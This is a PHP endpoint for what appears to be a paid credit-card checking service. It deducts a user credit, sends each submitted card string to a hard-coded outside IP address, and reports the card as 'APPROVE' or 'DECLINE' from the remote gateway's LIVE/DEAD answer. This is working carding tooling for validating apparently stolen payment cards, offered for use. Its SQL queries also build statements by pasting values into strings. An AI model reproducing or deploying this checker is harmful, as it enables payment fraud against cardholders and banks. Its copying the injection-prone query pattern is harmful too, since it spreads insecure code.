<?php
include('../config.php');
session_start();
header('Content-Type: application/json');

if (!isset($_SESSION['user_id'])) {
    echo json_encode(['status' => 'error', 'message' => 'Not logged in']);
    exit();
}

$user_id = $_SESSION['user_id'];

// Fetch current credits
$sql = "SELECT username, credit, total_cc, usertype FROM users WHERE id = '$user_id' LIMIT 1";
$result = mysqli_query($conn, $sql);
$user = mysqli_fetch_assoc($result);

if (!$user || $user['credit'] <= 0) {
    echo json_encode(['status' => 'error', 'message' => 'No credits left']);
    exit();
}

// Deduct 1 credit
$update = "UPDATE users SET credit = credit - 1 WHERE id = '$user_id'";
mysqli_query($conn, $update);

if (isset($_POST['cc'])) {
    $cc = trim($_POST['cc']);
    $api_url = "http://137.184.155.22/pp.php/?lista=" . urlencode($cc);

    $start = microtime(true);
    $response = @file_get_contents($api_url);
    $end = microtime(true);
    $time_taken = round($end - $start, 2);

    $decoded = json_decode($response, true);

    if (!$decoded || !isset($decoded['status'])) {
        echo json_encode([
            'status' => 'error',
            'message' => 'Invalid response from API',
            'raw' => $response
        ]);
        exit();
    }

    // Status logic
    $api_status = strtoupper($decoded['status']);
    if ($api_status === 'LIVE') {
        $status_display = '𝗔𝗣𝗣𝗥𝗢𝗩𝗘 ✅';
    } elseif ($api_status === 'DEAD') {
        $status_display = '𝗗𝗘𝗖𝗟𝗜𝗡𝗘 ❌';
    } else {
        $status_display = '𝗨𝗡𝗞𝗡𝗢𝗪𝗡 ⚠️';
    }

    echo json_encode([
        'status' => $status_display,
        'message' => $decoded['response_message'] ?? 'No message',
        'time' => $decoded['time_taken'] ?? ($time_taken . 's'),
        'card' => $decoded['card'] ?? '',
        'gateway' => $decoded['gateway'] ?? '',
        'raw' => $response
    ]);

} else {
    echo json_encode([
        'status' => 'Invalid Request',
        'message' => 'No card provided.'
    ]);
}
?>
